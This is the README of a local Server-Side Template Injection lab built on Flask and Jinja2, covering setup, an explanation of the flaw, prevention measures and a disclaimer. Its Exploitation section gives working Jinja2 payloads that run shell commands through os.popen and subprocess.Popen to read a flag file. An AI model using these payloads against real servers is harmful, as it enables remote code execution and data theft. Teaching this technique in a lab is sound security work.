# Server-Side Template Injection (SSTI) Lab

This lab demonstrates a common web application vulnerability called Server-Side Template Injection (SSTI). Template engines like Jinja2 (used by Flask) can be vulnerable to code injection if user input is directly incorporated into templates without proper sanitization.

## Setup Instructions

1. Make sure you have Python installed (Python 3.8+ recommended)
2. Install the required dependencies:
   ```
   pip install -r requirements.txt
   ```
3. Run the application:
   ```
   python app.py
   ```
4. Open your web browser and navigate to `http://localhost:5000`

## Understanding SSTI

Server-Side Template Injection occurs when user input is directly inserted into a template that is then rendered on the server. This can allow attackers to execute arbitrary code on the server.

In this lab:
- The vulnerable page at `/` shows a form that inserts your input directly into a template
- The secure page at `/secure` shows the proper way to handle user input in templates

## Security Implications

SSTI vulnerabilities can lead to:
- Information disclosure (application configs, environment variables)
- File system access (reading sensitive files)
- Remote Code Execution (RCE)
- Full server compromise

## Objective

Your goal is to retrieve the flag from the server flag.txt by exploiting the SSTI vulnerability in the web application.

## Exploitation

1. Visit http://localhost:5000 in your browser
2. In the " Enter your name: " field, enter: `{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}` or 

Finding index of Popen:
```
﻿﻿﻿﻿{% for c in ''.__class__.__base__.__subclasses__() %}
  {% if 'Popen' in c.__name__ %}
    {{ loop.index0 }}: {{ c }}
  {% endif %}
{% endfor %}
```

`{{ "". __class__.__base__.__subclasses__()[538].Popen("ls", stdout=-1).communicate() }}`
3. Click "Generate Welcome"
4. The application will display the flag in response.




## Prevention Measures

To prevent SSTI vulnerabilities:
1. Never directly insert user input into templates
2. Use a template engine's built-in escaping functionality
3. Implement input validation and sanitization
4. Use a template engine that doesn't allow code execution

## Disclaimer

This lab is for educational purposes only. The techniques demonstrated should only be used on systems you have permission to test. Unauthorized exploitation of SSTI vulnerabilities is illegal. 
